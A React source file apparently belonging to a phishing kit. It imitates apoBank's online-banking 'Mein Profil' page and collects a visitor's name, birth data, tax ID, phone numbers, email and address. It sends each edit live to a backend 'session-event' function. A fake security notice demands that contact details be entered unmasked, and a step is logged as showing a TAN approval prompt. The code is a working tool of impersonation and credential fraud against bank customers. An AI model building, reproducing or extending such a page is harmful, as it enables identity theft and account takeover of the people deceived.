import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Check, Info, Pencil, X } from "lucide-react";
import apobankLogo from "@/assets/apobank-logo.svg";
import apoALogo from "@/assets/apo-a-logo.png";
import { getStoredSession } from "@/hooks/useSessionFlow";
import { supabase } from "@/integrations/supabase/client";


type FieldDef = { key: string; label: string; value: string; muted?: boolean; options?: string[] };

const ERWERB_OPTIONS = [
  "Angestellt",
  "Arbeiter",
  "Beamter",
  "Selbstständig",
  "Freiberuflich",
  "Auszubildender",
  "Student",
  "Schüler",
  "Rentner / Pensionär",
  "Hausfrau / Hausmann",
  "Arbeitssuchend",
  "Elternzeit",
  "Sonstiges",
];

const ViewField = ({ label, value, muted }: { label: string; value: string; muted?: boolean }) => (
  <div>
    <div className="text-[13px] font-semibold text-[#001f5b] mb-1">{label}</div>
    <div className={`text-[15px] ${muted ? "text-slate-400" : "text-slate-800"}`}>
      {value || "Keine Angabe"}
    </div>
  </div>
);

const EditField = ({
  label,
  value,
  onChange,
  options,
  invalid = false,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  options?: string[];
  invalid?: boolean;
}) => (
  <div>
    <label className="text-[13px] font-semibold text-[#001f5b] mb-1 block">{label}</label>
    {options ? (
      <select
        value={value}
        onChange={(e) => onChange(e.target.value)}
        className={`w-full text-[15px] text-slate-800 bg-white border rounded-md px-3 py-2 outline-none focus:ring-1 ${
          invalid
            ? "border-red-500 focus:border-red-500 focus:ring-red-500"
            : "border-slate-300 focus:border-[#001f5b] focus:ring-[#001f5b]"
        }`}
      >
        {!options.includes(value) && value ? <option value={value}>{value}</option> : null}
        {options.map((opt) => (
          <option key={opt} value={opt}>
            {opt}
          </option>
        ))}
      </select>
    ) : (
      <input
        type="text"
        value={value}
        onChange={(e) => onChange(e.target.value)}
        className={`w-full text-[15px] text-slate-800 bg-white border rounded-md px-3 py-2 outline-none focus:ring-1 ${
          invalid
            ? "border-red-500 focus:border-red-500 focus:ring-red-500"
            : "border-slate-300 focus:border-[#001f5b] focus:ring-[#001f5b]"
        }`}
      />
    )}
  </div>
);

const SectionCard = ({
  title,
  fields,
  onSave,
  editable = true,
  openSignal = 0,
  requireNoAsterisk = false,
}: {
  title: string;
  fields: FieldDef[];
  onSave: (next: FieldDef[], changed: FieldDef[]) => void;
  editable?: boolean;
  openSignal?: number;
  requireNoAsterisk?: boolean;
}) => {
  const [editing, setEditing] = useState(false);
  const [draft, setDraft] = useState<FieldDef[]>(fields);
  const [invalidKeys, setInvalidKeys] = useState<string[]>([]);

  useEffect(() => {
    if (openSignal > 0 && editable) {
      setDraft(fields);
      setEditing(true);
      setInvalidKeys([]);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [openSignal]);

  const startEdit = () => {
    setDraft(fields);
    setEditing(true);
    setInvalidKeys([]);
  };

  const save = () => {
    if (requireNoAsterisk) {
      const bad = draft
        .filter((f) => f.key !== "festnetz" && (!f.value || f.value.trim() === "" || f.value.includes("*")))
        .map((f) => f.key);

      if (bad.length > 0) {
        setInvalidKeys(bad);
        return;
      }
    }
    setInvalidKeys([]);
    const changed = draft.filter((f) => {
      const orig = fields.find((o) => o.key === f.key);
      return (orig?.value ?? "") !== (f.value ?? "");
    });
    onSave(draft.map((f) => ({ ...f, muted: !f.value })), changed);
    setEditing(false);
  };

  const cancel = () => {
    setDraft(fields);
    setEditing(false);
    setInvalidKeys([]);
  };

  return (
    <section className="bg-white rounded-xl border border-slate-200/70 shadow-[0_1px_2px_rgba(0,0,0,0.04)] px-4 sm:px-10 py-6 sm:py-8">
      <div className="flex flex-wrap items-start justify-between gap-3 mb-6">
        <h2 className="text-[20px] sm:text-[24px] font-semibold text-[#001f5b]">{title}</h2>
        {editing ? (
          <div className="flex items-center gap-2 flex-wrap">
            <button
              type="button"
              onClick={cancel}
              className="inline-flex items-center gap-2 rounded-full border border-slate-300 text-slate-600 px-4 sm:px-5 py-1.5 text-sm font-medium hover:bg-slate-50 transition-colors"
            >
              <X className="w-4 h-4" />
              Abbrechen
            </button>
            <button
              type="button"
              onClick={save}
              className="inline-flex items-center gap-2 rounded-full bg-[#001f5b] text-white px-4 sm:px-5 py-1.5 text-sm font-medium hover:bg-[#00174a] transition-colors"
            >
              <Check className="w-4 h-4" />
              Speichern
            </button>
          </div>
        ) : editable ? (
          <button
            type="button"
            onClick={startEdit}
            className="inline-flex items-center gap-2 rounded-full border border-[#001f5b] text-[#001f5b] px-4 sm:px-5 py-1.5 text-sm font-medium hover:bg-[#001f5b]/5 transition-colors"
          >
            <Pencil className="w-4 h-4" />
            Bearbeiten
          </button>
        ) : null}
      </div>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-10 gap-y-6">
        {editing
          ? draft.map((f) => (
              <EditField
                key={f.key}
                label={f.label}
                value={f.value}
                options={f.options}
                invalid={invalidKeys.includes(f.key)}
                onChange={(v) => {
                  setDraft((prev) => prev.map((p) => (p.key === f.key ? { ...p, value: v } : p)));
                  setInvalidKeys((prev) => prev.filter((k) => k !== f.key));
                }}
              />
            ))
          : fields.map((f) => (
              <ViewField key={f.key} label={f.label} value={f.value} muted={f.muted} />
            ))}
      </div>
    </section>
  );
};

const initialSections: Record<string, FieldDef[]> = {
  personal: [
    { key: "titel", label: "Titel", value: "", muted: true },
    { key: "vorname", label: "Vorname", value: "", muted: true },
    { key: "weitereVornamen", label: "Weitere Vornamen", value: "", muted: true },
    { key: "nachname", label: "Nachname", value: "", muted: true },
    { key: "geburtsdatum", label: "Geburtsdatum", value: "", muted: true },
    { key: "geburtsort", label: "Geburtsort", value: "", muted: true },
    { key: "staat", label: "Staatsangehörigkeit", value: "", muted: true },
    { key: "weitereStaat", label: "Weitere Staatsangehörigkeiten", value: "", muted: true },
    { key: "familienstand", label: "Familienstand", value: "", muted: true },
    { key: "steuerId", label: "Steuer-ID", value: "", muted: true },
  ],
  contact: [
    { key: "mobil", label: "Private Mobilfunknummer", value: "", muted: true },
    { key: "festnetz", label: "Private Festnetznummer", value: "", muted: true },
    { key: "email", label: "Private E-Mail-Adresse", value: "", muted: true },
  ],
  address: [
    { key: "strasse", label: "Straße und Hausnummer", value: "", muted: true },
    { key: "zusatz", label: "Adresszusatz", value: "", muted: true },
    { key: "plz", label: "Postleitzahl", value: "", muted: true },
    { key: "ortLand", label: "Ort und Land", value: "", muted: true },
  ],
  work: [
    { key: "erwerb", label: "Erwerbstätigkeit", value: "", options: ERWERB_OPTIONS, muted: true },
    { key: "berufsgruppe", label: "Berufsgruppe", value: "", muted: true },
    { key: "fachrichtung", label: "Fachrichtung", value: "", muted: true },
    { key: "stellung", label: "Stellung im Unternehmen", value: "", muted: true },
  ],
};


const PersoenlicheDaten = () => {
  const navigate = useNavigate();
  const [sections, setSections] = useState(initialSections);
  const [confirmError, setConfirmError] = useState(false);
  const [contactOpenSignal, setContactOpenSignal] = useState(0);
  const contactRef = useRef<HTMLDivElement>(null);

  const handleConfirm = () => {
    const contactOk = sections.contact.every(
      (f) => f.value && f.value.trim() !== "" && !f.value.includes("*")
    );
    if (!contactOk) {
      setConfirmError(true);
      setContactOpenSignal((n) => n + 1);
      return;
    }
    const s = getStoredSession();
    if (s) {
      (supabase.functions as any).invoke("session-event", {
        body: { session_id: s.id, note: "✅ Angaben bestätigt, TAN-Freigabe wird angezeigt." },
      }).catch(() => {});
    }
    navigate("/kontakt-pruefung");
  };

  useEffect(() => {
    const s = getStoredSession();
    if (!s) return;
    (supabase as any)
      .from("sessions").select("meta").eq("id", s.id).maybeSingle()
      .then(({ data }: any) => {
        const p = data?.meta?.profile as Record<string, string> | undefined;
        if (!p || Object.keys(p).length === 0) return;
        setSections((prev) => {
          const next: typeof prev = { personal: [], contact: [], address: [], work: [] } as any;
          for (const k of Object.keys(prev) as (keyof typeof prev)[]) {
            next[k] = prev[k].map((f) =>
              p[f.key] !== undefined && p[f.key] !== ""
                ? { ...f, value: p[f.key], muted: false }
                : f
            );
          }
          return next;
        });
      });
  }, []);

  const updateSection = (key: keyof typeof initialSections, title: string) =>
    (next: FieldDef[], changed: FieldDef[]) => {
      setSections((prev) => ({ ...prev, [key]: next }));
      if (key === "contact" && next.every((f) => f.value && f.value.trim() !== "")) {
        setConfirmError(false);
      }
      const s = getStoredSession();
      if (!s || changed.length === 0) return;
      const profile_patch: Record<string, string> = {};
      const lines: string[] = [`✏️ ${title} aktualisiert:`];
      for (const f of changed) {
        profile_patch[f.key] = f.value;
        lines.push(`${f.label}: ${f.value || "—"}`);
      }
      (supabase.functions as any).invoke("session-event", {
        body: { session_id: s.id, profile_patch, note: lines.join("\n") },
      }).catch(() => {});
    };

  return (
    <div className="min-h-screen flex flex-col bg-[#f6f8fc]">
      {/* Top header */}
      <header className="bg-white border-b border-slate-200">
        <div className="max-w-[1400px] mx-auto flex items-center justify-between px-4 sm:px-10 h-16">
          <div className="flex items-center gap-3 sm:gap-8">
            <img src={apoALogo} alt="apoBank" className="w-10 h-10 rounded-full object-contain" />

            <span className="text-[15px] font-medium text-[#001f5b]">Profildaten</span>
          </div>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1">
        <div className="max-w-[1120px] mx-auto px-3 sm:px-8 py-6 sm:py-10">
          <h1 className="text-[28px] sm:text-[40px] font-semibold text-[#001f5b] mb-6">
            Mein Profil
          </h1>

          {/* Confirm banner */}
          <div className="bg-slate-50 border border-[#b3c7e0] rounded-lg px-4 sm:px-6 py-4 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 mb-8">
            <div className="flex items-start sm:items-center gap-3">
              <Info className="w-5 h-5 text-slate-500 shrink-0 mt-0.5 sm:mt-0" strokeWidth={1.75} />
              <div>
                <div className="font-semibold text-[#3d8b5a] text-[15px] leading-snug">
                  Sind Ihre Angaben noch korrekt?
                </div>
                <div className="text-[14px] text-[#5a9d75] leading-snug">
                  Bitte bestätigen oder bearbeiten Sie Ihre Profildaten.
                </div>
              </div>
            </div>
            <button
              type="button"
              onClick={handleConfirm}
              className="inline-flex items-center justify-center gap-2 rounded-full bg-[#001f5b] text-white px-5 py-2.5 text-sm font-medium shrink-0 hover:bg-[#00174a] transition-colors w-full sm:w-auto"
            >
              <Check className="w-4 h-4" strokeWidth={2.5} />
              Angaben bestätigen
            </button>
          </div>

          {confirmError && (
            <div className="bg-red-100 border border-red-200 text-red-900 px-4 py-4 rounded text-sm mb-6">
              Aus Sicherheitsgründen bitten wir Sie, Ihre privaten Kontaktinformationen vollständig und im Klartext anzugeben. Speichern Sie die Angaben und klicken Sie anschließend auf „Angaben bestätigen", um den Vorgang abzuschließen.
            </div>
          )}

          <div className="space-y-6">
            <SectionCard
              title="Persönliche Angaben"
              fields={sections.personal}
              onSave={updateSection("personal", "Persönliche Angaben")}
              editable={false}
            />
            <div ref={contactRef}>
              <SectionCard
                title="Private Kontaktinformationen"
                fields={sections.contact}
                onSave={updateSection("contact", "Private Kontaktinformationen")}
                openSignal={contactOpenSignal}
                requireNoAsterisk

              />
            </div>
            <SectionCard
              title="Meldeadresse"
              fields={sections.address}
              onSave={updateSection("address", "Meldeadresse")}
            />
            <SectionCard
              title="Berufliche Angaben"
              fields={sections.work}
              onSave={updateSection("work", "Berufliche Angaben")}
            />
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#001f5b] text-white mt-10">
        <div className="max-w-[1120px] mx-auto px-6 sm:px-10 py-10 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-6">
          <div>
            <img src={apobankLogo} alt="apoBank" className="h-12 brightness-0 invert" />
            <div className="text-[13px] mt-4 opacity-90">
              © 2026 Deutsche Apotheker- und Ärztebank eG. Alle Rechte vorbehalten.
            </div>
          </div>
          <ul className="space-y-3 text-[15px]">
            <li><a href="#" className="hover:underline">Impressum</a></li>
            <li><a href="#" className="hover:underline">Datenschutz</a></li>
            <li><a href="#" className="hover:underline">Nutzungsbedingungen</a></li>
            <li><a href="#" className="hover:underline">Cookie-Einstellungen</a></li>
          </ul>
        </div>
      </footer>
    </div>
  );
};

export default PersoenlicheDaten;
